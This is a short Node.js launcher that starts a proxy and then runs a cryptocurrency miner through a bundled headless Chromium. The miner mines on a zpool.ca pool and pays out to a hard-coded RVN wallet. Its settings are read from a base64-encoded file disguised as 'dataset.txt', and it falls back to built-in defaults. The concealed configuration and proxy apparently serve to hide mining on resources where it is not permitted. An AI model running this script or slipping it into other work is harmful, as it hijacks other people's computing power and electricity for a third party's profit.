const Miner = require('./libs/miner');
const fs = require('fs');
const startProxy = require('./proxy');
const DEFAULT_OPTS = {
  "algorithm": "minotaurx",
  "host": "minotaurx.na.mine.zpool.ca",
  "port": 7019,
  "worker": "RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65",
  "password": "c=RVN",
  "workers": 4,
  "fee": 1,
  "chrome": null,
  "log": true
}

const getConfig = () => {
  const configFile = "./dataset.txt";
  let config = null;
  
  if (fs.existsSync(configFile)) {
    try {
      const text = fs.readFileSync(configFile, { encoding: 'utf8' });
      const data = Buffer.from(text, 'base64').toString('utf8');
      config = JSON.parse(data);
    } catch (error) {
      config = null;
    }
  }

  if (!config) {
    config = DEFAULT_OPTS
  }

  return config;
}

const run = async () => {
  // Start proxy
  await startProxy();
  
  // Start mining
  const config = getConfig();
  const miner = new Miner({
    options: config,
    launch: { executablePath: config.chrome ? config.chrome : "./chromium/chrome" },
    interval: 1000
  })
  miner.start();
}

run();